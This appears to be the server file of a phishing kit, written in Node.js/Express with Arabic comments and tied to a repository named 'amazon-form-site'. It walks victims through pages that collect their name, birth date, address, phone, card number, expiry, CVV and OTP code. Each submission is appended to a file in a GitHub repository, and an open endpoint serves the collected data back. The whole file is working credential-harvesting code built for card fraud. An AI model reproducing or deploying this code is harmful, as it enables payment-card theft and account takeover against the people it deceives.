const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const REPO_OWNER = 'afffaaaa28-glitch';
const REPO_NAME = 'amazon-form-site';
const FILE_PATH = 'data.txt';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

// ========== دالة حفظ على GitHub ==========
async function saveToGitHub(newData) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
    
    let existingContent = '';
    let sha = '';
    try {
        const getRes = await fetch(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
        if (getRes.ok) {
            const fileInfo = await getRes.json();
            sha = fileInfo.sha;
            existingContent = Buffer.from(fileInfo.content, 'base64').toString('utf8');
        }
    } catch (e) {
        console.log('📄 الملف مش موجود، هيتعمل جديد');
    }

    const newContent = existingContent + '\n' + newData;
    const content = Buffer.from(newContent).toString('base64');
    
    await fetch(url, {
        method: 'PUT',
        headers: {
            Authorization: `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: `تحديث البيانات ${new Date().toISOString()}`,
            content,
            sha
        })
    });
}

// ========== المتغير المؤقت للبيانات ==========
let cachedData = '';
let lastFetchTime = 0;
const CACHE_DURATION = 5000; // 5 ثواني

// ========== دالة جلب البيانات من GitHub ==========
async function fetchFromGitHub() {
    try {
        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
        const response = await fetch(url, { 
            headers: { 
                Authorization: `token ${GITHUB_TOKEN}`,
                'Accept': 'application/json'
            } 
        });
        
        if (response.ok) {
            const fileInfo = await response.json();
            const content = Buffer.from(fileInfo.content, 'base64').toString('utf8');
            return content;
        }
        return '';
    } catch (e) {
        console.error('❌ خطأ في جلب البيانات:', e.message);
        return '';
    }
}

// ========== المسارات ==========
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page1.html')));
app.get('/page2', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page2.html')));
app.get('/page3', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page3.html')));
app.get('/page4', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page4.html')));
app.get('/page5', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page5.html')));

// ========== صفحة عرض البيانات ==========
app.get('/data-viewer', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'data-viewer.html'));
});

// ========== API لجلب البيانات (من الكاش) ==========
app.get('/api/data', async (req, res) => {
    try {
        const now = Date.now();
        
        // لو الكاش قديم، نجيب بيانات جديدة
        if (now - lastFetchTime > CACHE_DURATION) {
            console.log('🔄 تحديث الكاش...');
            cachedData = await fetchFromGitHub();
            lastFetchTime = now;
            console.log('✅ تم تحديث الكاش، الطول:', cachedData.length);
        }
        
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.send(cachedData);
    } catch (e) {
        console.error('❌ خطأ:', e.message);
        res.send(cachedData || '');
    }
});

// ========== استقبال بيانات العنوان ==========
app.post('/submit-data', async (req, res) => {
    try {
        const data = req.body;
        
        const cleanData = {
            '📦 بيانات الشحن': {
                'الاسم الكامل': data.username || 'غير محدد',
                'تاريخ الميلاد': `${data.dob_month || ''}/${data.dob_day || ''}/${data.dob_year || ''}`,
                'رقم الهاتف': data.phone || 'غير محدد',
                'الدولة': data.country || 'غير محدد',
                'العنوان': data.address_line1 || 'غير محدد',
                'العنوان (سطر 2)': data.address_line2 || 'غير محدد',
                'المدينة': data.city || 'غير محدد',
                'الولاية': data.state || 'غير محدد',
                'الرمز البريدي': data.zipcode || 'غير محدد'
            },
            '💳 بيانات الفوترة': {
                'الاسم الكامل': data.billing_username || data.billing_username_hidden || 'نفس الشحن',
                'العنوان': data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن',
                'العنوان (سطر 2)': data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن',
                'المدينة': data.billing_city || data.billing_city_hidden || 'نفس الشحن',
                'الولاية': data.billing_state || data.billing_state_hidden || 'نفس الشحن',
                'الرمز البريدي': data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن',
                'رقم الهاتف': data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'
            }
        };

        let logData = '\n' + '='.repeat(50) + '\n';
        logData += `📋 بيانات العميل الجديدة\n`;
        logData += `🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
        logData += '='.repeat(50) + '\n\n';

        logData += '📦 بيانات الشحن:\n';
        logData += '-'.repeat(40) + '\n';
        Object.entries(cleanData['📦 بيانات الشحن']).forEach(([key, value]) => {
            logData += `${key}: ${value}\n`;
        });

        logData += '\n💳 بيانات الفوترة:\n';
        logData += '-'.repeat(40) + '\n';
        Object.entries(cleanData['💳 بيانات الفوترة']).forEach(([key, value]) => {
            logData += `${key}: ${value}\n`;
        });

        logData += '\n' + '='.repeat(50) + '\n';

        await saveToGitHub(logData);
        console.log('✅ البيانات اتحفظت على GitHub');
        
        // تحديث الكاش فوراً
        cachedData = await fetchFromGitHub();
        lastFetchTime = Date.now();
        
        res.redirect('/page3');
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).send('خطأ في حفظ البيانات');
    }
});

// ========== استقبال بيانات الدفع ==========
app.post('/submit-payment', async (req, res) => {
    try {
        const data = req.body;
        
        let logData = '\n' + '='.repeat(50) + '\n';
        logData += `💳 بيانات بطاقة الدفع\n`;
        logData += `🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
        logData += '='.repeat(50) + '\n\n';
        logData += `اسم صاحب البطاقة: ${data.card_name || 'غير محدد'}\n`;
        logData += `رقم البطاقة: ${data.card_number || 'غير محدد'}\n`;
        logData += `تاريخ الانتهاء: ${data.card_expiry || 'غير محدد'}\n`;
        logData += `رمز CVV: ${data.card_cvv || 'غير محدد'}\n`;
        logData += '\n' + '='.repeat(50) + '\n';

        await saveToGitHub(logData);
        console.log('✅ بيانات البطاقة اتحفظت على GitHub');
        
        cachedData = await fetchFromGitHub();
        lastFetchTime = Date.now();
        
        res.redirect('/page4');
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).send('خطأ في حفظ البيانات');
    }
});

// ========== استقبال OTP ==========
app.post('/submit-otp', async (req, res) => {
    try {
        const data = req.body;
        
        let logData = '\n' + '='.repeat(50) + '\n';
        logData += `🔐 رمز التحقق OTP\n`;
        logData += `🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
        logData += '='.repeat(50) + '\n\n';
        logData += `رمز OTP: ${data.otp_code || 'غير محدد'}\n`;
        logData += '\n' + '='.repeat(50) + '\n';

        await saveToGitHub(logData);
        console.log('✅ OTP اتحفظ على GitHub');
        
        cachedData = await fetchFromGitHub();
        lastFetchTime = Date.now();
        
        res.redirect('/page5');
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).send('خطأ في حفظ البيانات');
    }
});

// ========== تحميل الكاش عند بدء التشغيل ==========
(async () => {
    console.log('🔄 جلب البيانات الأولي...');
    cachedData = await fetchFromGitHub();
    lastFetchTime = Date.now();
    console.log('✅ تم تحميل الكاش، الطول:', cachedData.length);
})();

app.listen(PORT, () => {
    console.log(`✅ السيرفر شغال على port ${PORT}`);
    console.log(`📊 صفحة عرض البيانات: http://localhost:${PORT}/data-viewer`);
});
